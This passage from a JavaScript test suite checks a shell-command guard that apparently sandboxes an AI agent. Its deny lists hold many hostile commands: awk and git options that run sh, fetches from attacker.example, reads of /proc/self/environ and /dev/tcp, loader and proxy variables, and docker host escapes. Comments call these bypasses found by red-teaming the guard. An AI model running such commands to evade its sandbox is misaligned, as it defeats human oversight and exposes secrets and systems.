  `cd ${R} && echo x >> exec.jsonl`, `cd ${R}; tee obs.jsonl`, `cd ${R} && cp a exec.jsonl`, `echo x >> "$RUN/exec.jsonl"`, `echo x > $RUN/obs.jsonl`,
  `echo x | tee $RUN/exec.jsonl`, `git archive -o ${R}/exec.jsonl HEAD`,
  // ... and nothing else in the run folder or marker dir is writable either: redirects, tee, cp/mv/install/ln/dd, sed -i, truncate, touch, mkdir, rm
  `echo x > ${R}/notes.txt`, `echo x 2> ${R}/err.txt`, `echo x >> ${R}/sub/f`, `echo x | tee ${R}/notes.txt`, `cp a ${R}/f`, `cp -t ${R} a`, `mv a ${R}/f`, `mv ${R}/f ${T}/g`,
  `install a ${R}/f`, `ln -s a ${R}/f`, `dd of=${R}/f`, `truncate -s 0 ${R}/f`, `touch ${R}/f`, `mkdir ${R}/sub`, `mkdir -p ${R}/a/b`, `sed -i 's/a/b/' ${R}/f`,
  `rm -f ${R}/f`, `rm -rf ${R}`, `rm -rf ${T}/lnk-run`, `echo x > ${R}/.skilldir`, `echo x > ${MD}/other`, `echo x > ${R}/*`, `echo x > ${R}/sub/*/y`, `cd ${R} && echo x > f`, `cd ${R} && mkdir sub`,
  `echo x > "$RUN/.skilldir"`, `tar -xf a.tar -C ${R}`, `echo x > ${T}/lnk-run/notes.txt`,
];
for (const c of DENY) test(`guard denies: ${show(c)}`, () => assert.equal(verdict(bash(c)), 'deny'));

// ---------- guard: option ALLOW-LISTS (the six bypasses found by red-teaming a deny-list of known-bad options) ----------
// Root cause: filtering on a leading `-` and denying KNOWN-bad options. Each program below now accepts only the options it is listed to take;
// any other spelling (attached value, `=` form, bundle, unique abbreviation, second program text) is denied. Table = known-bad spellings.
const REPO_T = join(T, 'repo');
const BYPASS_DENY = [
  // (1) awk: program text arriving through -e/--source, several of them, or inside a bundle
  `awk -e 'BEGIN{x=1}' -e 'BEGIN{system("id")}' f`, `awk --source='BEGIN{system("id")}' f`, `awk -e 'BEGIN{ "id" | getline }' f`, `gawk -e 'BEGIN{x}' -e '{print | "sh"}' f`,
  `awk -F: -e '{print > "x"}' f`, `awk -vx=1 -e 'BEGIN{system("x")}'`, `awk --source 'BEGIN{system("id")}' f`, `awk -e'BEGIN{system("id")}' f`, `awk --sou='BEGIN{system("id")}' f`,
  `awk --version`, `awk -h`, `awk -b '{print}' f`, `awk -S '{print}' f`, `awk -M '{print}' f`, `awk -p '{print}' f`, `awk -o '{print}' f`, `awk -D '{print}' f`,
  `awk -v 'BEGIN{system("x")}'`, `awk -F`, `awk -v`,
  // (2) git -c / --config-env: only display keys; remote.<n>.* and every other key can name a program
  `git -c remote.origin.uploadpack=x fetch origin`, `git -c remote.origin.receivepack=x fetch origin`, `git -c remote.origin.vcs=x fetch origin`, `git -c REMOTE.ORIGIN.UPLOADPACK=x fetch origin`,
  `git -c remote.origin.uploadpack='sh -c id' ls-remote origin`, `git --config-env=remote.origin.uploadpack=EVIL fetch origin`, `git --config-env remote.origin.uploadpack=EVIL ls-remote origin`,
  `git -c url.x.insteadOf=y fetch origin`, `git -c http.proxy=x fetch origin`, `git -c ssh.variant=x fetch origin`, `git -c log.showSignature=true log`, `git -c diff.tool=x diff`,
  `git -c trace2.eventTarget=/etc/x log`, `git -c uploadpack.packObjectsHook=x fetch origin`, `git -c foo.bar=x log`, `git -c x log`, `git -c core.quotepath=false log`,
  `git -c color.ui=false -c remote.origin.uploadpack=x fetch origin`, `git -c`, `git -c color.ui=false`, `git -cremote.origin.uploadpack=x fetch origin`,
  // git global options outside the list (pager, exec-path, super-prefix, anything unknown)
  `git -p log`, `git --paginate log`, `git -P log`, `git --super-prefix=x log`, `git --html-path`, `git --man-path`, `git --exec-path`, `git --attr-source=x log`, `git --list-cmds=all`,
  // (3) tar: -P/--absolute-names/-h/--dereference, abbreviations, and the list files that can carry -C lines
  `tar -xPf a.tar -C ${T}/x`, `tar xPf a.tar -C ${T}/x`, `tar -P -xf a.tar -C ${T}/x`, `tar -xf a.tar --absolute-names -C ${T}/x`, `tar -xhf a.tar -C ${T}/x`, `tar xhf a.tar -C ${T}/x`,
  `tar -xf a.tar --dereference -C ${T}/x`, `tar --absolute -xf a.tar -C ${T}/x`, `tar -xf a.tar -T list -C ${T}/x`, `tar -xf a.tar --files-from=list -C ${T}/x`, `tar -xf a.tar -X ex -C ${T}/x`,
  `tar -xf a.tar --exclude-from=ex -C ${T}/x`, `tar -xf a.tar --exclude-from ex -C ${T}/x`, `tar -xTf list a.tar -C ${T}/x`, `tar -xf a.tar -PC ${T}/x`, `tar -xf a.tar --abs -C ${T}/x`,
  // (4) git against a repo (and so a .git/config) that sits in the temp dir, where an agent can write one; or whose location cannot be known
  `git -C ${REPO_T} status`, `git -C ${T} status`, `git -C ${T}/lnk-self/repo status`, `git --git-dir=${REPO_T}/.git log`, `git --git-dir ${REPO_T}/.git log`, `git --work-tree=${REPO_T} status`,
  `git --work-tree ${REPO_T} status`, `cd ${REPO_T} && git status`, `cd ${T} && git log`, `GIT_DIR=${REPO_T}/.git git log`, `env GIT_DIR=${REPO_T} git log`, `export GIT_WORK_TREE=${REPO_T}`,
  `git -C ${T}/a -C b status`, `git -C "$X" status`, `git -C $(pwd) status`, `cd "$X" && git log`, `git --git-dir="$X" log`,
  `GIT_TRACE=/etc/x git log`, `GIT_TRACE2_EVENT=/etc/x git log`, `GIT_REDIRECT_STDERR=/etc/x git log`, `GIT_COMMON_DIR=${REPO_T} git log`, `GIT_INDEX_FILE=${T}/i git log`,
  `GIT_OBJECT_DIRECTORY=${T}/o git log`, `GIT_ALTERNATE_OBJECT_DIRECTORIES=${T}/o git log`, `GIT_CEILING_DIRECTORIES=/ git log`,
  // git archive -o writes a file anywhere
  `git archive -o /etc/x HEAD`, `git archive -o ~/.zshrc HEAD`, `git archive -oy.tar HEAD`, `git archive -vo x HEAD`, `git archive --output=x HEAD`, `git archive --out=x HEAD`,
  // (5) docker run: no network, no host files, nothing outside the list (no --env-file, --entrypoint, ports, users, extra capabilities)
  `docker run --name zt-a img`, `docker run --name zt-a img sh -c 'curl http://x'`, `docker run --name zt-a --network bridge img`, `docker run --name zt-a --network=container:x img`,
  `docker run --name zt-a --env-file /etc/x --network none img`, `docker run --name zt-a --env-file=/etc/x --network none img`, `docker run --name zt-a --entrypoint sh --network none img -c x`,
  `docker run --name zt-a --entrypoint=sh --network none img`, `docker run --name zt-a --network none -p 5432:5432 postgres:15`, `docker run -d --name zt-pg -e POSTGRES_PASSWORD=x -p 5432:5432 postgres:15`,
  `docker run --name zt-a --network none -e HOME img`, `docker run --name zt-a --network none --user root img`, `docker run --name zt-a --network none --add-host x:1.2.3.4 img`,
  `docker run --name zt-a --network none --pid=host img`, `docker run --name zt-a --network none --log-driver x img`, `docker run --name zt-a --network none --cgroup-parent x img`,
  `docker run --name zt-a --network none --dns 1.1.1.1 img`, `docker run --name zt-a --network none --publish 80:80 img`, `docker run --name zt-a --network none --volume-driver x img`,
  `docker run --name zt-a --network none --security-opt seccomp=unconfined img`, `docker run --name zt-a --network none --cap-add ALL img`, `docker run --name zt-a --network none --device /dev/x img`,
  `docker run --name zt-a --network none`, `docker run --network none img`, `docker run --name foo --network none img`, `docker run --name zt-a --network none --name foo img`,
  `docker run --name zt-a --network none --net host img`, `docker run --name zt-a --network none --network host img`, `docker run --name zt-a --network none -v/:/x img`,
  `docker run --name zt-a --network none --rm --init --userns host img`, `docker run --name zt-a --network none --ipc host img`, `docker run --name zt-a --network none --uts=host img`,
  `docker run --name zt-a --network none --restart always img`, `docker run --name zt-a --network none -l a=b img`, `docker run --name zt-a --network none --pull always img`,
  // tar --one-top-level=DIR extracts into DIR, whatever -C or the cwd say
  `tar -xf a.tar --one-top-level=/tmp/evil-outside -C ${T}/x`, `cd ${T}/x && tar --one-top-level=/tmp/evil-outside -xf archive.tar`, `tar -xf a.tar --one-top-level -C ${T}/x`,
  // git fetch / ls-remote: the repository must be a bare remote NAME (a configured remote); a URL, scp-like address, ext:: transport or path can reach any host
  `git fetch https://attacker.example/repo.git refs/heads/main`, `git ls-remote https://attacker.example/repo.git`, `git fetch --depth 1 https://attacker.example/x main`,
  `git fetch 'ext::sh -c id' main`, `git fetch git@evil.example:org/repo.git`, `git fetch ssh://h/x`, `git fetch file:///etc`, `git fetch /tmp/x`, `git fetch ./x`, `git fetch ~/x`,
  `git fetch ../x`, `git fetch -q origin main https://evil.example/x`, `git ls-remote --heads https://evil.example/x`, `git ls-remote -- https://evil.example/x`, `git fetch -- https://evil.example/x`,
  `git fetch "$X"`, `git fetch evil.example.com:path`, `git fetch origin 'ext::sh -c id'`, `git fetch -j 4 https://evil.example/x`, `git fetch --filter=blob:none http://evil.example/x`,
  // cwd tracking: a `cd` that runs in a subshell (group, pipeline, background, substitution), is undone (popd), is not the shell's (env/nice/timeout/nohup cd) or fails
  `(cd ${T}/sub); touch evil`, `(cd ${T}/sub); mkdir evil`, `(cd ${T}/sub); tee evil`, `(cd ${T}/exists); touch evil`, `cd ${T}/sub & touch evil`, `cd ${T}/exists & touch evil`,
  `cd ${T}/sub &\ntouch evil`, `{ cd ${T}/exists & }; touch evil`, `cd ${T}/exists | cat; touch evil`, `echo $(cd ${T}/exists); touch evil`, 'echo `cd ' + T + '/exists`; touch evil',
  `cd /work/repo && pushd ${T}/sub && popd && touch evil`, `pushd ${T}/exists; popd; touch evil`, `pushd ${T}/exists && popd && touch evil`, `pushd +1; touch evil`, `pushd; touch evil`,
  `env cd ${T}/exists; touch evil`, `nice cd ${T}/exists; touch evil`, `timeout 5 cd ${T}/exists; touch evil`, `nohup cd ${T}/exists; touch evil`, `stdbuf -oL cd ${T}/exists; touch evil`,
  `cd ${T}/nonexistent; touch evil`, `cd ${T}/nonexistent || touch evil`, `cd ${T}/nonexistent && echo hi; touch evil`, `cd ${T}/nonexistent\ntouch evil`, `cd ${T}/nonexistent && echo hi || touch evil`,
  `cd ${T}/exists || cd ${T}/other; touch evil`, `cd ${T}/exists && echo; cd ${T}/gone; touch evil`, `rm -rf ${T}/exists; cd ${T}/exists; touch evil`, `mv ${T}/exists ${T}/e2; cd ${T}/exists; touch evil`,
  `export CDPATH=${T}; cd exists; touch evil`, `CDPATH=${T} cd exists; touch evil`, `cd -; touch evil`, `cd; touch evil`, `cd "$X"; touch evil`,
  `cd ${T}/x && mkdir d; touch evil`, `cd ${T}/x && ls; touch evil`, `cd ${T}/x && ls | head; touch evil`, `popd; touch evil`, `cd ${T}/x && (cd ..); touch evil`,
  // round 2: a cd that may not run (conditional, in a compound, behind a pipe or `&`), takes options or extra words, or is backgrounded together with its `&&` list
  `false && cd ${T}; touch evil`, `true || cd ${T}; touch evil`, `test -d /nonexistent && cd ${T}; touch evil`, `if false; then cd ${T}; fi; touch evil`, `for i in; do cd ${T}; done; touch evil`,
  `while false; do cd ${T}; done; touch evil`, `until true; do cd ${T}; done; touch evil`, `case x in y) cd ${T};; esac; touch evil`, `cd ${T}/nonexist && cd ${T}; touch evil`,
  `{ cd ${T}; } | touch evil`, `{ cd ${T}; } & touch evil`, `{ cd ${T}; } | cat; touch evil`, `for i in 1; do cd ${T}; done | cat; touch evil`, `! cd ${T}; touch evil`,
  `cd -z ${T}; touch evil`, `cd -x ${T}; touch evil`, `cd -P ${T}; touch evil`, `cd -L ${T}; touch evil`, `cd -- ${T}; touch evil`, `cd ${T} x; touch evil`, `cd ${T} ${T}; touch evil`,
  `pushd -n ${T}; touch evil`, `pushd -n ${T} >/dev/null; echo hi > evil`, `pushd ${T} ${T}; touch evil`, `popd -n; touch evil`, `popd +0; touch evil`,
  `cd -P ${T}/link-to-etc/..; touch evil`, `cd ${T} && sleep 1 & touch evil`, `cd ${T} && (touch a) & touch evil`, `cd ${T} && touch a | cat & touch evil`, `cd ${T}/x && git log &\ntouch evil`,
  `echo a && cd ${T}; touch evil`, `echo a || cd ${T}; touch evil`, `true && true && cd ${T}; touch evil`, `cd ${T}/nonexist || cd ${T}; touch evil`,
  // `..` after a symlink is resolved by the kernel from the link's TARGET, not lexically
  `touch ${T}/link-to-etc/../x`, `echo x > ${T}/link-to-etc/../x`, `rm ${T}/link-to-etc/../x`, `cp a ${T}/lnk-self/../x`, `mkdir ${T}/lnk-self/../x`, `tee ${T}/lnk-self/../x`, `sed -i s/a/b/ ${T}/lnk-self/../x`,
  `mv ${T}/a ${T}/lnk-self/../x`, `sort -o ${T}/lnk-self/../x f`, `cp -t ${T}/lnk-self/.. a`,
  // the whole environment: jq env / $ENV, awk ENVIRON, /proc/*/environ read or redirected
  `jq -n env`, `jq -n '$ENV'`, `jq 'env | keys' f`, `jq -n 'env.HOME'`, `jq -n '$ENV.PATH'`, `awk 'BEGIN{for(k in ENVIRON) print k}'`, `gawk 'BEGIN{print ENVIRON["X"]}'`, `mawk 'BEGIN{print ENVIRON["X"]}'`,
  `cat /proc/self/environ`, `cat /proc/1/environ`, `tr '\\0' '\\n' < /proc/self/environ`, `head -c 100 < /proc/self/environ`, `grep -a X /proc/self/task/1/environ`, `strings /proc/self/environ`,
  // reading from a network pseudo-device through a redirect
  `cat < /dev/tcp/127.0.0.1/1`, `cat </dev/udp/1.2.3.4/53`, `grep x < /dev/tcp/h/80`, `exec 3< /dev/tcp/127.0.0.1/80`, `head -1 0</dev/tcp/h/80`,
  // git: no ref writes (tag/branch create, delete, move, force; reflog expire/delete; fetch into a local ref)
  `git tag evil`, `git tag -d evil`, `git tag -a x -m y`, `git tag -f x`, `git tag -s x`, `git tag -v x`, `git tag --delete x`, `git tag x HEAD`, `git tag -m msg x`,
  `git branch evil`, `git branch -D old`, `git branch -d old`, `git branch -m a b`, `git branch -M a`, `git branch -f main HEAD~1`, `git branch -c a b`, `git branch --delete x`, `git branch --move a b`,
  `git branch --track x origin/x`, `git branch --copy a b`, `git branch -f x`, `git branch evil HEAD`, `git branch --force x y`, `git branch --create-reflog x`,
  `git reflog expire --expire=now --all`, `git reflog delete HEAD@{0}`, `git reflog --expire=now`, `git reflog --stale-fix`, `git reflog --rewrite`, `git reflog --updateref`,
  `git fetch origin main:main`, `git fetch origin +HEAD:refs/heads/main`, `git fetch origin 'refs/heads/*:refs/heads/*'`, `git fetch origin main:mr7`, `git fetch upstream 'refs/heads/*:refs/remotes/upstream/*'`,
  `git fetch origin +refs/heads/a:refs/heads/b`, `git fetch -f origin x:y`,
  // the environment-variable families that steer node, git, ssh, docker and the loaders (prefix match, not a list that can fall behind)
  `NODE_V8_COVERAGE=/etc node ${NOTE} done --unit u`, `NODE_PATH=/x node ${NOTE} done --unit u`, `SSH_ASKPASS=x git fetch origin`, `GIT_ATTR_SOURCE=x git log`, `DYLD_FRAMEWORK_PATH=/x git log`,
  `LD_AUDIT=x git log`, `PYTHONPATH=x git log`, `DOCKER_BUILDKIT=1 docker ps`, `export NODE_V8_COVERAGE=/etc`, `GIT_AUTHOR_NAME=x git log`, `env NODE_EXTRA_CA_CERTS=/x git log`, `SSH_AUTH_SOCK=/x git fetch origin`,
  `ZT_SOMETHING_NEW=1 git log`, `XDG_DATA_HOME=/x git log`, `MALLOC_CONF=x git log`, `PERL5OPT=x git log`, `RUBYOPT=x git log`, `JAVA_TOOL_OPTIONS=x git log`,
  // round 3 (own pass): a newline after && / || continues the list, so the cd on the next line may be skipped
  `false &&\ncd ${T}; touch evil`, `false &&\ncd ${T}\ntouch evil`, `false ||\ncd ${T}\ntouch evil`, `true ||\ncd ${T}\ntouch evil`, `false && # c\ncd ${T}\ntouch evil`,
  // shell variables that make the shell itself or a child run something (PS4 is expanded, command substitutions included, by `set -x`), and tool config that names a program
  `export PS4='$(echo x >&2) '; set -x; ls`, `PS4='$(touch x)' ls`, `declare PS4=x`, `PS4=x`, `export PROMPT_COMMAND=x`, `export SHELLOPTS=xtrace`, `BASHOPTS=x ls`, `ENV=x ls`, `FPATH=x ls`,
  `RIPGREP_CONFIG_PATH=${T}/rc rg x f`, `https_proxy=http://evil.example:3128 git fetch origin`, `HTTPS_PROXY=http://evil.example git fetch origin`, `ALL_PROXY=socks5://evil.example git fetch origin`,
  `http_proxy=x git fetch origin`, `no_proxy=x git fetch origin`, `OPENSSL_CONF=${T}/x.cnf git fetch origin`, `SSL_CERT_FILE=${T}/ca git fetch origin`, `CURL_CA_BUNDLE=${T}/ca git fetch origin`,
  `GCONV_PATH=${T}/x sort f`, `LOCPATH=${T}/x sort f`, `NLSPATH=${T}/x sort f`, `HOSTALIASES=${T}/h git fetch origin`, `RES_OPTIONS=x git fetch origin`, `TZDIR=${T} date`, `TERMINFO=${T} ls`,
  // docker pull: the default registry only (an explicit registry host is a network destination), no options but -q
  `docker pull evil.example/x:1`, `docker pull localhost:5000/x`, `docker pull localhost/x`, `docker pull 10.0.0.1/x`, `docker pull --all-tags postgres`, `docker pull --platform linux/amd64 postgres`, `docker pull`,
  // bash evaluates some strings as ARITHMETIC, and arithmetic runs the command substitution inside an array subscript (a[$(cmd)]); what a variable holds (read from a
  // file, assigned earlier) cannot be known here, so only literal numbers may be evaluated. Also prompt expansion (${x@P}) and indirection.
  `echo $(( $(date +%s) - 5 ))`, `echo $(( 1 + $(echo 2) ))`, `echo $(( `+'`date +%s`'+` ))`, `x='a[$(touch evil)]'; echo $((x))`, `echo 'a[$(touch evil)]' > ${T}/f; read x < ${T}/f; echo $((x))`, `echo $((n*2))`, `n=$((n+1))`, `echo $((a > b))`, `echo $[x]`, `echo $[ x + 1 ]`,
  `echo $(( 1 + $(echo x) ))x`, `echo $(( x ))`, `echo $(( 1 + n ))`, `echo $(( $x ))`, `echo $(( 'a' ))`, `echo $(( a[1] ))`,
  `[[ $x -eq 1 ]]`, `[[ x -lt 1 ]]`, `[[ 1 -ne x ]]`, `[[ -v 'a[$(touch evil)]' ]]`, `[ -v 'a[$(touch evil)]' ]`, `test -v 'a[$(touch evil)]'`, `test -R x`, `[ -v x ]`,
  `unset 'a[$(touch evil)]'`, `export 'a[$(touch evil)]=1'`, `declare 'a[$(touch evil)]=1'`, `declare -i x='a[$(touch evil)]'`, `declare -i x`, `local -i x`, `typeset -i x`, `readonly -i x`,
  `echo \${X@P}`, `X='$(touch evil)'; echo \${X@P}`, `echo "\${x@P}"`, `echo \${!X}`, `echo "\${!X}"`, `echo \${x:y}`, `echo \${x:y:z}`, `echo \${a[i]}`, `echo \${a[$i]}`, `echo \${x: n}`,
  // (6) mv/cp -t / --target-directory in every spelling: attached, `=`, bundled, abbreviated, ledger/run-folder targets
  `mv --target-directory=/etc ${T}/f`, `mv -t/etc ${T}/f`, `mv -t /etc ${T}/f`, `mv --target-directory /etc ${T}/f`, `mv --target=/etc ${T}/f`, `mv --t=/etc ${T}/f`, `mv -ft/etc ${T}/f`,
  `cp -t/etc a`, `cp -at /etc a`, `cp -rt/etc a`, `cp -pt /etc a`, `cp --target-directory=/etc a`, `cp --target-directory /etc a`, `cp --target=/etc a`, `cp --targ /etc a`,
  `cp -t${R} a`, `cp --target-directory=${R} a`, `cp -pt${R} a`, `mv -t${R} ${T}/a`, `mv --target-directory=${R} ${T}/a`, `mv --target-directory=${MD} ${T}/a`, `cp -t ${MD} a`,
  `cp -t ${T}/ok -t /etc a`, `cp -t/etc -t ${T}/ok a`, `cp --target-directory=/etc --target-directory=${T}/ok a`, `mv -t ${T}/ok -t/etc ${T}/a`, `cp -T a /etc/x`,
  `cp --parents a /etc`, `cp --reflink=always a /etc/x`, `cp -S x a /etc/x`, `cp --suffix=x a /etc/x`, `cp --backup a /etc/x`, `cp --attributes-only a /etc/x`, `cp -t`, `mv -t`, `cp --target-directory`,
  `mv --exchange ${T}/a ${T}/b`, `mv -Z ${T}/a ${T}/b`, `cp -Z a ${T}/b`, `mv --context=x ${T}/a ${T}/b`, `mv --backup ${T}/a ${T}/b`, `mv -b ${T}/a ${T}/b`, `mv -S x ${T}/a ${T}/b`,
  // the same family in sort: a unique abbreviation of --output / --compress-program, and options that write elsewhere (-T)
  `sort --out=/etc/x f`, `sort --ou=${R}/notes f`, `sort --o=src/out f`, `sort --outp=src f`, `sort -T /etc f`, `sort --temporary-directory=/etc f`, `sort --tmp=/etc f`, `sort -S 1 -T /x f`,
  `sort --files0-from=x`, `sort --random-source=x f`, `sort --parallel=2 f`, `sort --batch-size=2 f`,
];
for (const c of BYPASS_DENY) test(`guard denies bypass: ${show(c)}`, () => assert.equal(verdict(bash(c)), 'deny'));
// a repo in the temp dir is also refused when the shell is already there (the hook input's cwd)
for (const c of [`git log`, `git -C . status`, `git -C .. status`, `git --git-dir=.git log`]) {
  test(`guard denies git with cwd in the temp dir: ${c}`, () => assert.equal(verdict(bash(c, FX, { cwd: REPO_T })), 'deny'));
}
test('guard denies git with cwd behind a symlink into the temp dir', () => assert.equal(verdict(bash('git log', FX, { cwd: join(T, 'lnk-self') })), 'deny'));
test('guard denies git with cwd = the temp dir itself', () => assert.equal(verdict(bash('git log', FX, { cwd: T })), 'deny'));

const BYPASS_ALLOW = [
  `awk -F: '{print $1}' f`, `awk -F ':' '{print $1}' f`, `awk -v x=1 -v y=2 'BEGIN{print x+y}'`, `awk -vx=1 'BEGIN{print x}'`, `awk -F: -- '{print $1}' f`, `gawk -F, '{print $2}' f`,
  `awk -F'|' '{print $1}' f`, `awk -F '\\t' '{print $1}' f`, `awk -v 'x=a b' 'BEGIN{print x}'`, `awk 'BEGIN{print 1}'`,
  `git -c color.ui=false log -1`, `git -c color.diff=always diff`, `git -c diff.renames=true log`, `git -c diff.algorithm=patience diff`, `git -c log.decorate=short log`, `git -c color.ui=never -c diff.context=5 diff`,
  `git --config-env=color.ui=SOME_ENV log`, `git --no-pager log`, `git --no-optional-locks status`, `git --literal-pathspecs log -- f`, `git --version`,
  `git -C /work/repo log`, `git -C /work/repo -C sub log`, `git --git-dir=/work/repo/.git log`, `git --git-dir /work/repo/.git --work-tree /work/repo status`, `git --work-tree=/work/repo status`,
  `cd /work/repo && git log`, `git diff --stat`, `git fetch -q origin main`, `git archive HEAD | tar -x -C ${T}/src`, `git show HEAD:a > ${T}/a`, `git archive --format=tar HEAD`, `git archive --prefix=p/ HEAD`, `git archive -9 HEAD`, `git archive -l`,
  `tar -xf a.tar -C ${T}/x`, `tar -xzf a.tgz -C ${T}/x --strip-components=1`, `tar -xvf a.tar -C ${T}/x`, `tar -xpf a.tar -C ${T}/x`, `tar -xkf a.tar -C ${T}/x`, `tar -xmf a.tar -C ${T}/x`,
  `tar -xOf a.tar -C ${T}/x member`, `tar -tvf a.tar`, `tar -xf a.tar -C ${T}/x --exclude='*.o' --exclude=x`,
  `docker run -d --name zt-pg --network none -e POSTGRES_PASSWORD=x postgres:15`, `docker run --rm --name zt-a --network=none img echo hi`, `docker run --name zt-a --net none --memory 512m --cpus 1 img`,
  `docker run --rm -it --name zt-a --network none img sh`, `docker run -d --name=zt-a --network none --env A=1 --env B=2 img`, `docker run --name zt-a --network none -m 512m --pids-limit 100 --read-only img`,
  `cp -r a ${T}/b`, `cp -a /work/repo/a ${T}/x`, `cp -t ${T}/d a`, `cp -t${T}/d a`, `cp --target-directory=${T}/d a`, `cp --target-directory ${T}/d a`, `cp -rt ${T}/d a b`, `cp -v -p a ${T}/c`, `cp -n a ${T}/c`,
  `cp -R -L a ${T}/c`, `cp -rp a ${T}/c`, `cp --recursive --preserve=mode a ${T}/c`, `cp -f -i a ${T}/c`, `cp -- a ${T}/c`, `cp -T a ${T}/c`, `cp -u a b ${T}/d`,
  `mv -f ${T}/a ${T}/b`, `mv -t ${T}/d ${T}/a ${T}/b`, `mv --target-directory=${T}/d ${T}/a`, `mv -v -n ${T}/a ${T}/b`, `mv -ft ${T}/d ${T}/a`, `mv -- ${T}/a ${T}/b`, `mv -T ${T}/a ${T}/b`, `mv -i -u ${T}/a ${T}/b`,
  `git fetch origin refs/merge-requests/7/head`, `git fetch -q origin main`, `git fetch`, `git fetch --all`, `git fetch --depth 1 origin main`, `git fetch --depth=1 origin`,
  `git ls-remote origin`, `git ls-remote --heads origin main`, `git ls-remote`, `git fetch -p origin`,
  `git fetch -j 4 origin`, `git fetch --filter=blob:none origin`, `git remote show origin`,
  // cwd tracking that stays exact: `;` / newline after a cd to a directory that EXISTS, `&&` chains, groups, pushd/popd pairs, builtin wrappers
  `cd ${T}/exists; touch f`, `cd ${T}/exists\ntouch f`, `cd ${T}/x && touch f`, `(cd ${T}/x && touch f)`, `(cd ${T}/x); touch ${T}/abs`, `cd ${T}/x && touch a && touch b`,
  `cd ${T}/exists && touch a; touch b`, `pushd ${T}/x && touch f`, `echo hi; cd ${T}/x && touch f`, `cd ${T}; touch f`, `(cd ${T}/x && touch f); touch ${T}/abs`, `cd /work/repo && git log`,
  `(cd /work/repo && git log -1)`, `cd ${T}/x && ls | head`, `command cd ${T}/x && touch f`, `builtin cd ${T}/x && touch f`, `time cd ${T}/x && touch f`, `cd ${T}/exists && touch a | cat`,
  `cd ${T}/exists; (cd /work/repo && git log); touch f`, `(cd ${T}/exists; touch f)`, `cd ${T}/exists && { touch f; touch g; }`, `cd ${T}/exists/..; touch evil-but-inside-temp`, `echo $(cd ${T}/x && pwd); touch ${T}/abs`,
  `git branch --list 'feat/*'`, `git branch -l`, `git branch --show-current`, `git branch -r --contains HEAD`, `git branch --merged main`, `git branch -a --sort=-committerdate`, `git branch -avv`, `git branch --no-merged main`,
  `git tag --list 'v1*'`, `git tag -n`, `git tag -n5 -l`, `git tag --contains HEAD`, `git tag --sort=-v:refname`, `git tag --points-at HEAD`, `git tag -l --format='%(refname)'`, `git reflog`, `git reflog show HEAD`,
  `git reflog -5`, `git reflog exists refs/heads/main`, `git reflog show --date=iso -3`,
  `jq .env file.json`, `jq '.a.env' f`, `jq '.[] | .name' f`, `jq -r '.items[].id' f`, `awk '{print $1}' f`, `cat < ${R}/exec.jsonl`, `wc -l < f`, `grep x < f`,
  `cd ${T}; touch f`, `cd ${T}\ntouch f`, `cd ${T} && touch f`, `(cd ${T} && touch f)`, `cd ${T} && ls | head`, `cd ${T} && touch a && touch b; touch ${T}/abs`,
  `docker pull library/postgres`, `docker pull -q postgres:15`, `docker pull --quiet redis:7`, `LC_ALL=C sort f`, `while IFS= read -r l; do echo $l; done < f`, `TZ=UTC date`, `LANG=C grep x f`, `cd ${T} &&\ntouch f`,
  `echo $(( (1+2) * 3 ))`, `echo \${x:1:2}`, `echo \${x:-default}`, `echo \${a[0]}`, `echo \${a[@]}`, `echo \${a[*]}`, `echo \${#a[@]}`, `[[ -f a ]]`, `[[ a == b ]]`, `[[ a =~ b ]]`, `[ -d b ]`, `test -f a`,
  `[ "$a" = b ]`, `[[ -n $x ]]`, `export FOO=1`, `declare -a arr`, `declare -p FOO`, `declare -x FOO=1`, `echo $((1 + 2 * 3 - 4 / 2 % 3))`, `echo $((0x1F + 010))`, `echo $(( 1 < 2 && 3 > 2 ? 1 : 0 ))`,
  `sort -u f`, `sort -k2,2 -t: -n f`, `sort -nr f`, `sort -rn -k3 f`, `sort --unique --reverse f`, `sort --key=2 --field-separator=: f`, `sort -c f`, `sort -V f`, `sort -h f`, `sort -f -d -b f`,
];
for (const c of BYPASS_ALLOW) test(`guard allows after the allow-lists: ${show(c)}`, () => assert.equal(verdict(bash(c)), 'allow'));

// environment switches must not steer the sandbox runner, the run folder or the loaders: prefix, `env`, and `export` forms
const STEERING = ['ZT_SANDBOX_FORCE', 'ZT_TESTS_ONLY', 'ZT_SANDBOX_PLAN', 'ZT_RUN_DIR', 'ZT_MARKER_DIR', 'ZT_LEDGER', 'XDG_RUNTIME_DIR', 'HOME', 'TMPDIR',
  'LD_PRELOAD', 'LD_LIBRARY_PATH', 'DYLD_INSERT_LIBRARIES', 'DYLD_LIBRARY_PATH', 'NODE_OPTIONS', 'PYTHONSTARTUP', 'BASH_ENV',
  'PATH', 'ZT_SANDBOX_IMAGE', 'DOCKER_HOST', 'DOCKER_CONFIG', 'DOCKER_CONTEXT', 'XDG_CONFIG_HOME', 'XDG_CACHE_HOME',
  'GIT_CONFIG_GLOBAL', 'GIT_CONFIG_SYSTEM', 'GIT_CONFIG_COUNT', 'GIT_CONFIG_PARAMETERS', 'GIT_SSH', 'GIT_SSH_COMMAND', 'GIT_EXTERNAL_DIFF', 'GIT_PAGER', 'GIT_EDITOR',
  'GIT_ASKPASS', 'GIT_EXEC_PATH', 'GIT_PROXY_COMMAND', 'GIT_TEMPLATE_DIR', 'PAGER', 'EDITOR', 'VISUAL',
  // which repo (and so which .git/config) git reads, and files it writes
  'GIT_DIR', 'GIT_WORK_TREE', 'GIT_COMMON_DIR', 'GIT_INDEX_FILE', 'GIT_OBJECT_DIRECTORY', 'GIT_ALTERNATE_OBJECT_DIRECTORIES', 'GIT_CEILING_DIRECTORIES', 'GIT_CONFIG',
  'GIT_TRACE', 'GIT_TRACE2', 'GIT_TRACE2_EVENT', 'GIT_TRACE_PACKET', 'GIT_REDIRECT_STDERR',
  // `cd NAME` searches CDPATH first
  'CDPATH',
  // shell variables that run code or name a program/config/host: PS4 is expanded by `set -x`, RIPGREP_CONFIG_PATH holds rg options such as --pre, proxies redirect git fetch
  'PS4', 'PROMPT_COMMAND', 'SHELLOPTS', 'BASHOPTS', 'ENV', 'FPATH', 'RIPGREP_CONFIG_PATH', 'OPENSSL_CONF', 'SSL_CERT_FILE', 'CURL_CA_BUNDLE', 'GCONV_PATH', 'LOCPATH', 'NLSPATH',
  'HOSTALIASES', 'RES_OPTIONS', 'TZDIR', 'TERMINFO', 'http_proxy', 'https_proxy', 'all_proxy', 'no_proxy', 'HTTP_PROXY', 'HTTPS_PROXY', 'ALL_PROXY', 'NO_PROXY'];
for (const v of STEERING) {
  for (const c of [`${v}=1 node ${SANDBOX} --cwd /r -- ls`, `env ${v}=1 git log`, `export ${v}=1 && ls`]) {
